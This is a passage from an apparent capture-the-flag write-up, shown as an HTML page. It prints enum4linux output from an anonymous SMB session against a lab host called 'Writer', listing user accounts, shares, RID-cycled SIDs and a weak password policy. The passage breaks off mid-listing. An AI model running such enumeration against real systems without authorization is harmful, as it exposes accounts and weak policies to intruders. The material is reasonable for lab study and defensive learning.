<h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><h3 id="Enum4linux"><a href="#Enum4linux" class="headerlink" title="Enum4linux"></a>Enum4linux</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br></pre></td><td class="code"><pre><span class="line">Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Aug  1 02:04:47 2021</span><br><span class="line"></span><br><span class="line"> ========================== </span><br><span class="line">|    Target Information    |</span><br><span class="line"> ========================== </span><br><span class="line">Target ........... 10.10.11.101</span><br><span class="line">RID Range ........ 500-550,1000-1050</span><br><span class="line">Username ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Password ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ==================================================== </span><br><span class="line">|    Enumerating Workgroup/Domain on 10.10.11.101    |</span><br><span class="line"> ==================================================== </span><br><span class="line">[+] Got domain/workgroup name: WORKGROUP</span><br><span class="line"></span><br><span class="line"> ============================================ </span><br><span class="line">|    Nbtstat Information <span class="keyword">for</span> 10.10.11.101    |</span><br><span class="line"> ============================================ </span><br><span class="line">Looking up status of 10.10.11.101</span><br><span class="line">	WRITER          &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service</span><br><span class="line">	WRITER          &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service</span><br><span class="line">	WRITER          &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service</span><br><span class="line">	..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">	WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name</span><br><span class="line">	WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">	WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections</span><br><span class="line"></span><br><span class="line">	MAC Address = 00-00-00-00-00-00</span><br><span class="line"></span><br><span class="line"> ===================================== </span><br><span class="line">|    Session Check on 10.10.11.101    |</span><br><span class="line"> ===================================== </span><br><span class="line">[+] Server 10.10.11.101 allows sessions using username <span class="string">&#x27;&#x27;</span>, password <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"> =========================================== </span><br><span class="line">|    Getting domain SID <span class="keyword">for</span> 10.10.11.101    |</span><br><span class="line"> =========================================== </span><br><span class="line">Domain Name: WORKGROUP</span><br><span class="line">Domain Sid: (NULL SID)</span><br><span class="line">[+] Can<span class="string">&#x27;t determine if host is part of domain or part of a workgroup</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ====================================== </span></span><br><span class="line"><span class="string">|    OS information on 10.10.11.101    |</span></span><br><span class="line"><span class="string"> ====================================== </span></span><br><span class="line"><span class="string">[+] Got OS info for 10.10.11.101 from smbclient: </span></span><br><span class="line"><span class="string">[+] Got OS info for 10.10.11.101 from srvinfo:</span></span><br><span class="line"><span class="string">	WRITER         Wk Sv PrQ Unx NT SNT writer server (Samba, Ubuntu)</span></span><br><span class="line"><span class="string">	platform_id     :	500</span></span><br><span class="line"><span class="string">	os version      :	6.1</span></span><br><span class="line"><span class="string">	server type     :	0x809a03</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ============================= </span></span><br><span class="line"><span class="string">|    Users on 10.10.11.101    |</span></span><br><span class="line"><span class="string"> ============================= </span></span><br><span class="line"><span class="string">index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: kyle	Name: Kyle Travis	Desc: </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">user:[kyle] rid:[0x3e8]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ========================================= </span></span><br><span class="line"><span class="string">|    Share Enumeration on 10.10.11.101    |</span></span><br><span class="line"><span class="string"> ========================================= </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	Sharename       Type      Comment</span></span><br><span class="line"><span class="string">	---------       ----      -------</span></span><br><span class="line"><span class="string">	print$          Disk      Printer Drivers</span></span><br><span class="line"><span class="string">	writer2_project Disk      </span></span><br><span class="line"><span class="string">	IPC$            IPC       IPC Service (writer server (Samba, Ubuntu))</span></span><br><span class="line"><span class="string">SMB1 disabled -- no workgroup available</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Attempting to map shares on 10.10.11.101</span></span><br><span class="line"><span class="string">//10.10.11.101/print$	Mapping: DENIED, Listing: N/A</span></span><br><span class="line"><span class="string">//10.10.11.101/writer2_project	Mapping: DENIED, Listing: N/A</span></span><br><span class="line"><span class="string">//10.10.11.101/IPC$	[E] Can&#x27;</span>t understand response:</span><br><span class="line">NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*</span><br><span class="line"></span><br><span class="line"> ==================================================== </span><br><span class="line">|    Password Policy Information <span class="keyword">for</span> 10.10.11.101    |</span><br><span class="line"> ==================================================== </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Attaching to 10.10.11.101 using a NULL share</span><br><span class="line"></span><br><span class="line">[+] Trying protocol 139/SMB...</span><br><span class="line"></span><br><span class="line">[+] Found domain(s):</span><br><span class="line"></span><br><span class="line">	[+] WRITER</span><br><span class="line">	[+] Builtin</span><br><span class="line"></span><br><span class="line">[+] Password Info <span class="keyword">for</span> Domain: WRITER</span><br><span class="line"></span><br><span class="line">	[+] Minimum password length: 5</span><br><span class="line">	[+] Password <span class="built_in">history</span> length: None</span><br><span class="line">	[+] Maximum password age: 37 days 6 hours 21 minutes </span><br><span class="line">	[+] Password Complexity Flags: 000000</span><br><span class="line"></span><br><span class="line">		[+] Domain Refuse Password Change: 0</span><br><span class="line">		[+] Domain Password Store Cleartext: 0</span><br><span class="line">		[+] Domain Password Lockout Admins: 0</span><br><span class="line">		[+] Domain Password No Clear Change: 0</span><br><span class="line">		[+] Domain Password No Anon Change: 0</span><br><span class="line">		[+] Domain Password Complex: 0</span><br><span class="line"></span><br><span class="line">	[+] Minimum password age: None</span><br><span class="line">	[+] Reset Account Lockout Counter: 30 minutes </span><br><span class="line">	[+] Locked Account Duration: 30 minutes </span><br><span class="line">	[+] Account Lockout Threshold: None</span><br><span class="line">	[+] Forced Log off Time: 37 days 6 hours 21 minutes </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Retieved partial password policy with rpcclient:</span><br><span class="line"></span><br><span class="line">Password Complexity: Disabled</span><br><span class="line">Minimum Password Length: 5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ============================== </span><br><span class="line">|    Groups on 10.10.11.101    |</span><br><span class="line"> ============================== </span><br><span class="line"></span><br><span class="line">[+] Getting <span class="built_in">builtin</span> <span class="built_in">groups</span>:</span><br><span class="line"></span><br><span class="line">[+] Getting <span class="built_in">builtin</span> group memberships:</span><br><span class="line"></span><br><span class="line">[+] Getting <span class="built_in">local</span> <span class="built_in">groups</span>:</span><br><span class="line"></span><br><span class="line">[+] Getting <span class="built_in">local</span> group memberships:</span><br><span class="line"></span><br><span class="line">[+] Getting domain <span class="built_in">groups</span>:</span><br><span class="line"></span><br><span class="line">[+] Getting domain group memberships:</span><br><span class="line"></span><br><span class="line"> ======================================================================= </span><br><span class="line">|    Users on 10.10.11.101 via RID cycling (RIDS: 500-550,1000-1050)    |</span><br><span class="line"> ======================================================================= </span><br><span class="line">[I] Found new SID: S-1-22-1</span><br><span class="line">[I] Found new SID: S-1-5-21-1663171886-1921258872-720408159</span><br><span class="line">[I] Found new SID: S-1-5-32</span><br><span class="line">[+] Enumerating <span class="built_in">users</span> using SID S-1-5-21-1663171886-1921258872-720408159 and logon username <span class="string">&#x27;&#x27;</span>, password <span class="string">&#x27;&#x27;</span></span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-500 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-501 WRITER\nobody (Local User)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-502 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-503 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-504 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-505 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-506 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-507 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-508 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-509 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-510 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-511 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-512 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-513 WRITER\None (Domain Group)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-514 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-515 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-516 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-517 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-518 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-519 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-520 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-521 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-522 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-523 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-524 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-525 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-526 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-527 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-528 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-529 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-530 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-531 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-532 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-533 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-534 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-535 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-536 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-537 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-538 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-539 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-540 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-541 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-542 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-543 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-544 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-545 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-546 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-547 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-548 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-549 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-550 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1000 WRITER\kyle (Local User)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1001 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1002 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1003 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1004 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1005 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1006 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1007 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1008 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1009 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1010 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1011 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1012 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1013 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1014 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1015 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1016 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1017 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1018 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1019 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1020 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1021 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1022 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1023 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1024 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1025 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1026 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1027 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1028 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1029 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1030 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1031 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1032 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1033 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1034 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1035 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1036 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1037 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1038 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1039 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1040 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1041 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1042 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1043 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1044 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1045 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1046 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1047 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1048 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1049 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-21-1663171886-1921258872-720408159-1050 *unknown*\*unknown* (8)</span><br><span class="line">[+] Enumerating <span class="built_in">users</span> using SID S-1-22-1 and logon username <span class="string">&#x27;&#x27;</span>, password <span class="string">&#x27;&#x27;</span></span><br><span class="line">S-1-22-1-1000 Unix User\kyle (Local User)</span><br><span class="line">S-1-22-1-1001 Unix User\john (Local User)</span><br><span class="line">[+] Enumerating <span class="built_in">users</span> using SID S-1-5-32 and logon username <span class="string">&#x27;&#x27;</span>, password <span class="string">&#x27;&#x27;</span></span><br><span class="line">S-1-5-32-500 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-501 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-502 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-503 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-504 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-505 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-506 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-507 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-508 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-509 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-510 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-511 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-512 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-513 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-514 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-515 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-516 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-517 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-518 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-519 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-520 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-521 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-522 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-523 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-524 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-525 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-526 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-527 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-528 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-529 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-530 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-531 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-532 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-533 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-534 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-535 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-536 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-537 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-538 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-539 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-540 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-541 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-542 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-543 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-544 BUILTIN\Administrators (Local Group)</span><br><span class="line">S-1-5-32-545 BUILTIN\Users (Local Group)</span><br><span class="line">S-1-5-32-546 BUILTIN\Guests (Local Group)</span><br><span class="line">S-1-5-32-547 BUILTIN\Power Users (Local Group)</span><br><span class="line">S-1-5-32-548 BUILTIN\Account Operators (Local Group)</span><br><span class="line">S-1-5-32-549 BUILTIN\Server Operators (Local Group)</span><br><span class="line">S-1-5-32-550 BUILTIN\Print Operators (Local Group)</span><br><span class="line">S-1-5-32-1000 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1001 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1002 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1003 *unknown*\*unknown* 